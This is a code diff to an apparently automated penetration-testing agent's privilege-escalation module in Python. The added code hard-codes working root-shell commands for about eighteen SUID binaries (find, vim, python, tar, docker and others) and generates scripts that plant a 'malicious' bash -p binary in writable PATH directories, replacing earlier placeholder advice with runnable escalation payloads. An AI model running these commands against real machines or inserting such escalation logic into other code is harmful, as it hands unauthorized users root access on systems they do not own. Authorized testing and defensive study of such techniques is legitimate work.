@@ -94,29 +94,75 @@ class PrivilegeEscalationAgent(BaseAgent):
         binary_path = finding.description.split(": ")[-1]
         binary_name = binary_path.split("/")[-1]
 
-        # Check GTFOBins
-        # In a real implementation, this would be a more robust check, perhaps using an API or a local copy.
+        # Check GTFOBins database
         gtfobins_url = f"https://gtfobins.github.io/gtfobins/{binary_name}/"
-        # This is a placeholder for a web fetch call
-        # For now, we'll just assume that if it's a common binary, it's exploitable.
-        common_exploitable_suids = ["find", "nmap", "vim", "bash", "cp", "mv"]
-        if binary_name in common_exploitable_suids:
+        
+        # Comprehensive list of exploitable SUID binaries from GTFOBins
+        exploitable_binaries = {
+            "find": "find . -exec /bin/sh -p \\; -quit",
+            "nmap": "nmap --interactive\nnmap> !sh",
+            "vim": "vim -c ':py3 import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'\nvim -c ':!sh'",
+            "bash": "bash -p",
+            "cp": "cp /bin/sh /tmp/sh && chmod +s /tmp/sh && /tmp/sh -p",
+            "mv": "mv /bin/sh /tmp/sh && chmod +s /tmp/sh && /tmp/sh -p",
+            "python": "python -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'",
+            "python3": "python3 -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'",
+            "perl": "perl -e 'exec \"/bin/sh\";'",
+            "ruby": "ruby -e 'exec \"/bin/sh\"'",
+            "awk": "awk 'BEGIN {system(\"/bin/sh\")}'",
+            "less": "less /etc/profile\n!sh",
+            "more": "more /etc/profile\n!sh",
+            "nano": "nano\n^R^X\nreset; sh 1>&0 2>&0",
+            "tar": "tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh",
+            "zip": "zip /tmp/test.zip /tmp/test -T --unzip-command='sh -c /bin/sh'",
+            "git": "git help config\n!/bin/sh",
+            "docker": "docker run -v /:/mnt --rm -it alpine chroot /mnt sh"
+        }
+        
+        if binary_name in exploitable_binaries:
             return PrivilegeEscalationVector(
                 type="SUID_BINARY",
-                details=f"The SUID binary '{binary_path}' can likely be used for privilege escalation.",
-                command=f"Check GTFOBins for exploitation details: {gtfobins_url}",
-                confidence=0.9
+                details=f"The SUID binary '{binary_path}' can be exploited for privilege escalation.",
+                command=exploitable_binaries[binary_name],
+                confidence=0.95
             )
+        
+        # Check for partial matches (e.g., python2.7, python3.8)
+        for key in exploitable_binaries:
+            if key in binary_name.lower():
+                return PrivilegeEscalationVector(
+                    type="SUID_BINARY",
+                    details=f"The SUID binary '{binary_path}' (variant of {key}) may be exploitable.",
+                    command=exploitable_binaries[key],
+                    confidence=0.85
+                )
+        
         return None
 
     async def _analyze_writable_directory(self, finding: PostExFinding) -> PrivilegeEscalationVector | None:
         """Analyzes a writable directory finding."""
-        # For now, this is a placeholder. A real implementation would check if the directory is in the PATH.
+        directory = finding.description.split(': ')[-1]
+        
+        # Check if directory is in common PATH locations
+        high_value_paths = [
+            "/usr/local/bin", "/usr/bin", "/bin", "/usr/sbin", "/sbin",
+            "/usr/local/sbin", "/opt/bin", "/snap/bin"
+        ]
+        
+        confidence = 0.5
+        command = f"# Check if {directory} is in PATH\necho $PATH | grep -q {directory}\n"
+        
+        if any(directory.startswith(path) for path in high_value_paths):
+            confidence = 0.9
+            command += f"\n# Create malicious binary\ncat > {directory}/exploit << 'EOF'\n#!/bin/bash\n/bin/bash -p\nEOF\nchmod +x {directory}/exploit\n"
+        else:
+            command += f"\n# If in PATH, create malicious binary\ncat > {directory}/malicious << 'EOF'\n#!/bin/bash\n/bin/bash -p\nEOF\nchmod +x {directory}/malicious\n"
+        
         return PrivilegeEscalationVector(
             type="WRITABLE_DIRECTORY",
-            details=f"The directory '{finding.description.split(': ')[-1]}' is writable, which could lead to privilege escalation.",
-            command="Check if the directory is in the PATH of a privileged user. If so, a malicious binary can be placed there.",
-            confidence=0.7
+            details=f"The directory '{directory}' is writable. If in PATH, can be used for privilege escalation via binary hijacking.",
+            command=command,
+            confidence=confidence
         )
 
     async def _analyze_unquoted_service_path(self, finding: PostExFinding) -> PrivilegeEscalationVector | None:
